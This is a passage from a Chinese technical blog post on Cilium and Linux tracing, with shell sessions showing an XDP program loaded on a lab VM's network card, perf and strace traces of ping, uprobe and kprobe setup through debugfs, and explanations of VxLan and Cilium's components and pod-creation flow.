class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:82:8b:d7 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    inet 192.168.19.84/16 brd 192.168.255.255 scope global ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fe82:8bd7/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>加载程序之前ping虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ping 192.168.19.84</span><br><span class="line">PING 192.168.19.84 (192.168.19.84): 56 data bytes</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=0 ttl=60 time=98.922 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=1 ttl=60 time=104.328 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=2 ttl=60 time=101.547 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=3 ttl=60 time=107.351 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=4 ttl=60 time=62.270 ms</span><br><span class="line">64 bytes from 192.168.19.84: icmp_seq=5 ttl=60 time=84.121 ms</span><br><span class="line">^C</span><br><span class="line">--- 192.168.19.84 ping statistics ---</span><br><span class="line">6 packets transmitted, 6 packets received, 0.0% packet loss</span><br><span class="line">round-trip min/avg/max/stddev = 62.270/93.090/107.351/15.629 ms</span><br></pre></td></tr></table></figure><p>加载xdp程序到网卡设备</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip link set dev ens160 xdp obj xdp-example.o</span><br></pre></td></tr></table></figure><p>检查是否已经挂载到<code>ens160</code>网卡</p><p><img src="/2022/03/18/略知一二之Cilium/3.png" alt="3"></p><p>加载程序之后ping虚拟机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ping 192.168.19.84                    </span><br><span class="line">PING 192.168.19.84 (192.168.19.84): 56 data bytes</span><br><span class="line">Request timeout for icmp_seq 0</span><br><span class="line">Request timeout for icmp_seq 1</span><br><span class="line">Request timeout for icmp_seq 2</span><br><span class="line">Request timeout for icmp_seq 3</span><br><span class="line">^C</span><br><span class="line">--- 192.168.19.84 ping statistics ---</span><br><span class="line">5 packets transmitted, 0 packets received, 100.0% packet loss</span><br></pre></td></tr></table></figure><p>卸载xdp程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip link set dev ens160 xdp off</span><br></pre></td></tr></table></figure><h4 id="内核跟踪"><a href="#内核跟踪" class="headerlink" title="内核跟踪"></a>内核跟踪</h4><p><img src="/2022/03/18/略知一二之Cilium/4.png" alt="4"></p><h5 id="动态追踪历史"><a href="#动态追踪历史" class="headerlink" title="动态追踪历史"></a>动态追踪历史</h5><p>严格来讲 Linux 中的动态追踪技术其实是一种高级的调试技术, 可以在内核态和用户态进行深入的分析, 方便开发者或系统管理者便捷快速的定位和处理问题</p><p>如下表所示, 为 Linux 追踪技术的大致发展历程</p><div class="table-container"><table><thead><tr><th style="text-align:center">年份</th><th style="text-align:center">技术</th></tr></thead><tbody><tr><td style="text-align:center">2004</td><td style="text-align:center">kprobes/kretprobes</td></tr><tr><td style="text-align:center">2005</td><td style="text-align:center">systemtap</td></tr><tr><td style="text-align:center">2008</td><td style="text-align:center">ftrace</td></tr><tr><td style="text-align:center">2009</td><td style="text-align:center">perf_events</td></tr><tr><td style="text-align:center">2009</td><td style="text-align:center">tracepoints</td></tr><tr><td style="text-align:center">2012</td><td style="text-align:center">uprobes</td></tr><tr><td style="text-align:center">2015</td><td style="text-align:center">eBPF</td></tr></tbody></table></div><h5 id="tracepoint"><a href="#tracepoint" class="headerlink" title="tracepoint"></a>tracepoint</h5><p>tracepoints是散落在内核源码中的一些hook，它们可以在特定的代码被执行到时触发，这一特定可以被各种trace/debug工具所使用。</p><p>perf将tracepoint产生的时间记录下来，生成报告，通过分析这些报告，条有人缘便可以了解程序运行期间内核的各种细节，对性能症状做出准确的诊断。</p><p>安装perf工具</p><p>首先下载内核对应的源码包：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br><span class="line">root@ubuntu:~# cd linux-5.8/tools/perf/</span><br><span class="line">root@ubuntu:~# make</span><br><span class="line">root@ubuntu:~# sudo make install</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf list tracepoint</span><br><span class="line"></span><br><span class="line">List of pre-defined events (to be used in -e):</span><br><span class="line"></span><br><span class="line">  alarmtimer:alarmtimer_cancel                       [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_fired                        [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_start                        [Tracepoint event]</span><br><span class="line">  alarmtimer:alarmtimer_suspend                      [Tracepoint event]</span><br><span class="line">  block:block_bio_backmerge                          [Tracepoint event]</span><br><span class="line">  block:block_bio_bounce                             [Tracepoint event]</span><br><span class="line">  block:block_bio_complete                           [Tracepoint event]</span><br><span class="line">  block:block_bio_frontmerge                         [Tracepoint event]</span><br><span class="line">  block:block_bio_queue                              [Tracepoint event]</span><br><span class="line">  block:block_bio_remap                              [Tracepoint event]</span><br><span class="line">  block:block_dirty_buffer                           [Tracepoint event]</span><br><span class="line">  block:block_getrq                                  [Tracepoint event]</span><br><span class="line">  block:block_plug                                   [Tracepoint event]</span><br><span class="line">  block:block_rq_complete                            [Tracepoint event]</span><br><span class="line">  block:block_rq_insert                              [Tracepoint event]</span><br><span class="line">  block:block_rq_issue                               [Tracepoint event]</span><br><span class="line">  block:block_rq_remap                               [Tracepoint event]</span><br><span class="line">  block:block_rq_requeue                             [Tracepoint event]</span><br><span class="line">  block:block_sleeprq                                [Tracepoint event]</span><br><span class="line">  block:block_split                                  [Tracepoint event]</span><br><span class="line">  block:block_touch_buffer                           [Tracepoint event]</span><br><span class="line">  block:block_unplug                                 [Tracepoint event]</span><br></pre></td></tr></table></figure><p>用户空间下，ping命令的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# strace -fF -e trace=network ping 114.114.114.114 -c 1</span><br><span class="line">strace: deprecated option -F ignored</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3</span><br><span class="line">socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5</span><br><span class="line">connect(5, &#123;sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("114.114.114.114")&#125;, 16) = 0</span><br><span class="line">getsockname(5, &#123;sa_family=AF_INET, sin_port=htons(51536), sin_addr=inet_addr("192.168.19.84")&#125;, [16]) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RECVERR, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RECVTTL, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_IP, IP_RETOPTS, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_SNDBUF, [324], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_RCVBUF, [65536], 4) = 0</span><br><span class="line">getsockopt(3, SOL_SOCKET, SO_RCVBUF, [131072], [4]) = 0</span><br><span class="line">PING 114.114.114.114 (114.114.114.114) 56(84) bytes of data.</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_TIMESTAMP, [1], 4) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_SNDTIMEO, "\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) = 0</span><br><span class="line">setsockopt(3, SOL_SOCKET, SO_RCVTIMEO, "\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) = 0</span><br><span class="line">sendto(3, "\10\0\177\7\0\0\0\1\345\0053b\0\0\0\0\227\274\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., 64, 0, &#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("114.114.114.114")&#125;, 16) = 64</span><br><span class="line">recvmsg(3, &#123;msg_name=&#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("114.114.114.114")&#125;, msg_namelen=128-&gt;16, msg_iov=[&#123;iov_base="\0\0\207\3\0\4\0\1\345\0053b\0\0\0\0\227\274\n\0\0\0\0\0\20\21\22\23\24\25\26\27"..., iov_len=192&#125;], msg_iovlen=1, msg_control=[&#123;cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SCM_TIMESTAMP, cmsg_data=&#123;tv_sec=1647511013, tv_usec=720786&#125;&#125;, &#123;cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[66]&#125;], msg_controllen=56, msg_flags=0&#125;, 0) = 64</span><br><span class="line">64 bytes from 114.114.114.114: icmp_seq=1 ttl=66 time=17.1 ms</span><br><span class="line"></span><br><span class="line">--- 114.114.114.114 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 17.147/17.147/17.147/0.000 ms</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>内核空间下，ping命令的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf trace --event 'net:*' ping 114.114.114.114 -c 1 &gt; /dev/null </span><br><span class="line">     0.000 ping/3954500 net:net_dev_queue(skbaddr: 0xffff9204a4a42600, len: 98, name: "ens160")</span><br><span class="line">     0.044 ping/3954500 net:net_dev_start_xmit(name: "ens160", queue_mapping: 3, skbaddr: 0xffff9204a4a42600, protocol: 2048, len: 98, network_offset: 14, transport_offset_valid: 1, transport_offset: 34)</span><br><span class="line">     0.087 ping/3954500 net:net_dev_xmit(skbaddr: 0xffff9204a4a42600, len: 98, name: "ens160")</span><br></pre></td></tr></table></figure><p>除此之外，还可以通过perf查看系统调用函数使用cpu的情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/linux-5.8/tools/perf# ./perf top</span><br><span class="line">   PerfTop:   16433 irqs/sec  kernel:66.4%  exact:  0.0% lost: 0/0 drop: 0/0 [4000Hz cpu-clock:pppH],  (all, 4 CPUs)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">     9.79%  [kernel]          [k] finish_task_switch</span><br><span class="line">     4.87%  [kernel]          [k] __lock_text_start</span><br><span class="line">     1.81%  [kernel]          [k] do_syscall_64</span><br><span class="line">     1.25%  [kernel]          [k] do_user_addr_fault</span><br><span class="line">     1.13%  [kernel]          [k] clear_page_orig</span><br><span class="line">     0.80%  [kernel]          [k] __softirqentry_text_start</span><br><span class="line">     0.72%  [kernel]          [k] exit_to_usermode_loop</span><br><span class="line">     0.51%  perf              [.] dso__find_symbol</span><br><span class="line">     0.48%  [kernel]          [k] rmqueue_pcplist.constprop.0</span><br><span class="line">     0.45%  [kernel]          [k] strchr</span><br><span class="line">     0.44%  perf              [.] hists__findnew_entry</span><br><span class="line">     0.42%  [kernel]          [k] copy_page_regs</span><br><span class="line">     0.40%  perf              [.] hist_entry__sort</span><br><span class="line">     0.39%  [kernel]          [k] memset_orig</span><br><span class="line">     0.38%  [kernel]          [k] string_escape_mem</span><br><span class="line">     0.36%  perf              [.] __symbols__insert</span><br><span class="line">     0.35%  perf              [.] rb_next</span><br><span class="line">     0.34%  [kernel]          [k] zap_pte_range</span><br><span class="line">     0.33%  perf              [.] sort__dso_cmp</span><br><span class="line">     0.33%  [kernel]          [k] _raw_spin_lock</span><br><span class="line">     0.32%  ld-2.31.so        [.] 0x000000000000e304</span><br><span class="line">     0.30%  perf              [.] perf_hpp__is_dynamic_entry</span><br><span class="line">     0.30%  [kernel]          [k] __schedule</span><br><span class="line">     0.29%  dockerd           [.] crypto/sha256.block</span><br><span class="line">     0.29%  perf              [.] evsel__parse_sample</span><br><span class="line">     0.29%  perf              [.] hpp__sort_overhead</span><br><span class="line">     0.28%  [kernel]          [k] copy_user_generic_unrolled</span><br><span class="line">     0.28%  [kernel]          [k] filemap_map_pages</span><br><span class="line">     0.27%  dockerd           [.] runtime.mallocgc</span><br><span class="line">     0.26%  [kernel]          [k] __handle_mm_fault</span><br><span class="line">     0.26%  kube-apiserver    [.] 0x0000000001068802</span><br><span class="line">     0.26%  [kernel]          [k] __d_lookup_rcu</span><br><span class="line">     0.26%  [kernel]          [k] memcg_kmem_get_cache</span><br><span class="line">     0.25%  [kernel]          [k] __d_lookup</span><br><span class="line">     0.23%  dockerd           [.] runtime.scanobject</span><br><span class="line">     0.23%  perf              [.] sort__sym_cmp</span><br><span class="line">     0.22%  [kernel]          [k] kmem_cache_alloc</span><br><span class="line">     0.21%  [kernel]          [k] rcu_all_qs</span><br><span class="line">     0.21%  [kernel]          [k] handle_mm_fault</span><br><span class="line">     0.19%  [kernel]          [k] __run_timers.part.0</span><br><span class="line">     0.19%  [kernel]          [k] free_unref_page_list</span><br></pre></td></tr></table></figure><h5 id="uprobes"><a href="#uprobes" class="headerlink" title="uprobes"></a>uprobes</h5><p>uprobe是用户态的探针，它和kprobe是相对应的，kprobe是内核态的探针。uprobe需要制定用户态探针在执行文件中的位置，插入探针的原理和kprobe类似。</p><p>准备一个测试代码<code>demo.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"current count = %d\n"</span>,count);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      print_info();</span><br><span class="line">      system(<span class="string">"sleep 1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# gcc demo.c -o demo</span><br><span class="line">root@ubuntu:~/uprobe# ./demo </span><br><span class="line">current count = 0</span><br><span class="line">current count = 1</span><br><span class="line">current count = 2</span><br><span class="line">current count = 3</span><br><span class="line">current count = 4</span><br><span class="line">current count = 5</span><br><span class="line">current count = 6</span><br><span class="line">current count = 7</span><br></pre></td></tr></table></figure><p>这个时候如果程序出现问题，我们就可以通过uprobe查看相关信息。</p><p>首先通过<code>objdump</code>查看相关段的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# objdump -t demo | grep print</span><br><span class="line">0000000000000000       F *UND*0000000000000000              printf@@GLIBC_2.2.5</span><br><span class="line">0000000000001169 g     F .text0000000000000033              print_info</span><br></pre></td></tr></table></figure><p>添加程序相关信息到uprobe点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/uprobe_events </span><br><span class="line">root@ubuntu:~/uprobe# echo 'p:print_info ~/uprobe/demo:0x1169 %ip %ax' &gt; /sys/kernel/debug/tracing/uprobe_events</span><br><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/uprobe_events</span><br><span class="line">p:uprobes/print_info ~/uprobe/demo:0x0000000000001169 arg1=%ip arg2=%ax</span><br></pre></td></tr></table></figure><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# echo 1 &gt; /sys/kernel/debug/tracing/events/uprobes/enable</span><br></pre></td></tr></table></figure><p>查看日志信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# cat /sys/kernel/debug/tracing/trace</span><br><span class="line"><span class="meta">#</span> tracer: nop</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span> entries-in-buffer/entries-written: 10/10   #P:4</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span>                              _-----=&gt; irqs-off</span><br><span class="line"><span class="meta">#</span>                             / _----=&gt; need-resched</span><br><span class="line"><span class="meta">#</span>                            | / _---=&gt; hardirq/softirq</span><br><span class="line"><span class="meta">#</span>                            || / _--=&gt; preempt-depth</span><br><span class="line"><span class="meta">#</span>                            ||| /     delay</span><br><span class="line"><span class="meta">#</span>           TASK-PID   CPU#  ||||    TIMESTAMP  FUNCTION</span><br><span class="line"><span class="meta">#</span>              | |       |   ||||       |         |</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239242.207371: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239243.212293: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239244.217997: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [000] d... 1239245.235024: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239246.240172: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239247.247020: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239248.255470: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [003] d... 1239249.260487: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [001] d... 1239250.266369: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br><span class="line">           &lt;...&gt;-4007899 [001] d... 1239251.271204: print_info: (0x55e58e23e169) arg1=0x55e58e23e169 arg2=0x0</span><br></pre></td></tr></table></figure><p>关闭及清理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/uprobe# echo 0 &gt; /sys/kernel/debug/tracing/events/uprobes/enable</span><br><span class="line">root@ubuntu:~/uprobe# &gt; /sys/kernel/debug/tracing/trace</span><br></pre></td></tr></table></figure><h5 id="kprobe"><a href="#kprobe" class="headerlink" title="kprobe"></a>kprobe</h5><p>Kprobe是一种内核调测手段，它可以动态地跟踪内核的行为、收集debug信息和性能信息。</p><p>查看<code>do_sys_open</code>系统调用的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo 'r:myprobe do_sys_open' &gt; /sys/kernel/debug/tracing/kprobe_events </span><br><span class="line">root@ubuntu:~# cat /sys/kernel/debug/tracing/kprobe_events</span><br><span class="line">r4:kprobes/myprobe do_sys_open</span><br></pre></td></tr></table></figure><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo 1 &gt; /sys/kernel/debug/tracing/events/kprobes/enable</span><br></pre></td></tr></table></figure><p>查看调用信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cat /sys/kernel/debug/tracing/trace</span><br></pre></td></tr></table></figure><h4 id="网络跟踪"><a href="#网络跟踪" class="headerlink" title="网络跟踪"></a>网络跟踪</h4><ul><li>BPF XDP</li><li>BPF TC hooks</li><li>BPF Cgroups</li><li>BPF sockmap and sockops</li><li>BPF system calls</li></ul><p><img src="/2022/03/18/略知一二之Cilium/5.png" alt="5"></p><h4 id="Cilium-vs-Kube-router"><a href="#Cilium-vs-Kube-router" class="headerlink" title="Cilium vs Kube-router"></a>Cilium vs Kube-router</h4><p><img src="/2022/03/18/略知一二之Cilium/6.png" alt="6"></p><h5 id="VxLan"><a href="#VxLan" class="headerlink" title="VxLan"></a>VxLan</h5><p><code>VxLan</code>（Virtual eXtensible Local Area Network，虚拟可扩展局域网），是一种虚拟化隧道通信技术。它是一种 Overlay（覆盖网络）技术，通过三层的网络来搭建虚拟的二层网络。</p><p>简单来讲，<code>VxLan</code>是在底层物理网络（underlay）之上使用隧道技术，借助 <code>UDP</code> 层构建的 Overlay 的逻辑网络，使逻辑网络与物理网络解耦，实现灵活的组网需求。它对原有的网络架构几乎没有影响，不需要对原网络做任何改动，即可架设一层新的网络。也正是因为这个特性，很多CNI插件会选择 <code>VxLan</code> 作为通信网络。</p><p><code>VxLan</code> 不仅支持一对一，也支持一对多，一个 <code>VxLan</code> 设备能通过像网桥一样的学习方式学习到其他对端的 IP 地址，还可以直接配置静态转发表。</p><p>VxLan常见术语</p><ul><li><p>VTEP（VXLAN Tunnel Endpoints，VxLan 隧道端点）</p><p>VxLan 网络的边缘设备，用来进行VxLan报文的处理（封包和解包）。VTEP 可以是网络设备（比如交换机），也可以是一台机器（比如虚拟化集群中的宿主机）。</p></li><li><p>VNI（VxLan Network Identifier，VxLan 网络标识符）</p><p><code>VNI</code> 是每个 VXLAN 段的标识，是个 24 位整数，一共有16777216个，一般每个 <code>VNI</code> 对应一个租户，也就是说使用 <code>VxLan</code> 搭建的公有云可以理论上可以支撑千万级别的租户。</p></li><li><p>Tunnel（VxLan 隧道）</p><p>隧道是一个逻辑上的概念，在 VxLan 模型中并没有具体的物理实体向对应。隧道可以看做是一种虚拟通道，VxLan 通信双方认为自己是在直接通信，并不知道底层网络的存在。从整体来说，每个 VxLan 网络像是为通信的虚拟机搭建了一个单独的通信通道，也就是隧道。</p></li></ul><h4 id="Cilium组件"><a href="#Cilium组件" class="headerlink" title="Cilium组件"></a>Cilium组件</h4><h5 id="Cilium-agent"><a href="#Cilium-agent" class="headerlink" title="Cilium agent"></a>Cilium agent</h5><ul><li>以Node为单位</li><li>采用DaemonSet方式部署</li><li>通过CNI插件与CRI和Kubernetes交互</li><li>采用IPAM地址分配方式</li><li>生成eBPF程序，编译字节码，Attach到内核</li></ul><p><img src="/2022/03/18/略知一二之Cilium/7.jpeg" alt="7"></p><h5 id="Cilium-operator"><a href="#Cilium-operator" class="headerlink" title="Cilium operator"></a>Cilium operator</h5><p><img src="/2022/03/18/略知一二之Cilium/8.png" alt="8"></p><h5 id="Cilium控制平面"><a href="#Cilium控制平面" class="headerlink" title="Cilium控制平面"></a>Cilium控制平面</h5><p>创建一个Pod的流程</p><ul><li>kubectl将对应的请求发给API Server</li><li>API Server将对应的pod信息写到etcd中</li><li>Scheduler服务会watch API Server，选择合适的节点</li><li>kublet调用CRI-Containerd创建容器</li><li>创建对应的容器网络，调用CNI-Plugin，即调用Cilium agent</li><li>Cilium agent创建对应的网络，调用<code>bpf_syscall()</code></li></ul><p><img src="/2022/03/18/略知一二之Cilium/9.png" alt="9"></p><h5 id="Cilium数据平面-ipvs-iptables"><a href="#Cilium数据平面-ipvs-iptables" class="headerlink" title="Cilium数据平面-ipvs/iptables"></a>Cilium数据平面-ipvs/iptables</h5><p>从网卡到Pod经历了哪些点</p><p><img src="/2022/03/18/略知一二之Cilium/10.png" alt="10"></p><ul><li>经过eth0，此时数据放在Ring 